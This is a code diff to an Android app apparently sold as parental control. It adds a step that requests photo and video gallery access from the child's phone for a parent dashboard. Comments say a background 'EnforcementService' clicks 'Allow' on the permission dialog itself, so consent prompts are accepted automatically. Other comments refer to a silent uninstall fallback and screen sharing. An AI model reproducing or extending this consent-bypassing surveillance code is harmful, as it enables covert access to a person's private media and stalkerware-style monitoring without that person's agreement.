@@ -224,6 +224,7 @@ class MainActivity : ComponentActivity() {
         callsLauncher: ActivityResultLauncher<Array<String>>,
         micLauncher: ActivityResultLauncher<String>,
         postNotifLauncher: ActivityResultLauncher<String>,
+        galleryLauncher: ActivityResultLauncher<Array<String>>,
         onProgress: (String) -> Unit
     ): String {
         data class AutoStep(val key: String, val done: () -> Boolean, val launch: () -> Unit, val timeoutMs: Long = 30_000L)
@@ -262,6 +263,19 @@ class MainActivity : ComponentActivity() {
                 )
             }),
             AutoStep("mic", { hasMic(ctx) }, { micLauncher.launch(Manifest.permission.RECORD_AUDIO) }),
+            // Gallery: parent dashboard "🖼️ Gallery" card ke liye MediaStore read
+            // (Android 13+ granular, 12- par READ_EXTERNAL_STORAGE). Runtime dialog
+            // par EnforcementService "gallery" step Allow khud click karta hai.
+            AutoStep("gallery", {
+                ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
+                    ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+            }, {
+                galleryLauncher.launch(
+                    if (Build.VERSION.SDK_INT >= 33)
+                        arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
+                    else arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
+                )
+            }),
             // Android 13+ (14/15 included): POST_NOTIFICATIONS grant na ho to
             // bachche ke phone par parent ka message notification, screen-share
             // notification aur silent uninstall fallback — KUCH bhi visible nahi
@@ -346,6 +360,14 @@ class MainActivity : ComponentActivity() {
             if (!granted) maybeOpenPermSettings(this@MainActivity, listOf(Manifest.permission.RECORD_AUDIO))
         }
         val postNotifLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
+        val galleryLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { result ->
+            // Android 14 partial (visual-user-selected) par settings page mat
+            // kholo — partial grant bhi chalega. Sirf bilkul kuch na mile to kholo.
+            val any = result.values.any { it }
+            if (!any && android.os.Build.VERSION.SDK_INT < 34) {
+                maybeOpenPermSettings(this@MainActivity, result.keys.toList())
+            }
+        }
         var autoBusy by remember { mutableStateOf(false) }
         var autoMsg by remember { mutableStateOf("") }
         var autoSetupDone by remember { mutableStateOf(false) }
@@ -397,7 +419,7 @@ class MainActivity : ComponentActivity() {
             autoBusy = true
             autoMsg = "Auto-setup chal raha hai…"
             autoMsg = autoGrantSequence(
-                this@MainActivity, locLauncher, camLauncher, callsLauncher, micLauncher, postNotifLauncher
+                this@MainActivity, locLauncher, camLauncher, callsLauncher, micLauncher, postNotifLauncher, galleryLauncher
             ) { p -> autoMsg = p }
             autoBusy = false
             if (coreDone()) {
@@ -555,6 +577,12 @@ class MainActivity : ComponentActivity() {
             if (!granted) maybeOpenPermSettings(ctx, listOf(Manifest.permission.RECORD_AUDIO))
         }
         val postNotifLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
+        val galleryLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { result ->
+            val any = result.values.any { it }
+            if (!any && android.os.Build.VERSION.SDK_INT < 34) {
+                maybeOpenPermSettings(ctx, result.keys.toList())
+            }
+        }
         val adminLauncher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) {}
         var autoMsg by remember { mutableStateOf("") }
         var autoBusy by remember { mutableStateOf(false) }
@@ -579,7 +607,7 @@ class MainActivity : ComponentActivity() {
                     autoBusy = true
                     scope.launch {
                         autoMsg = autoGrantSequence(
-                            ctx, locLauncher, camLauncher, callsLauncher, micLauncher, postNotifLauncher
+                            ctx, locLauncher, camLauncher, callsLauncher, micLauncher, postNotifLauncher, galleryLauncher
                         ) { p -> autoMsg = p }
                         autoBusy = false
                     }
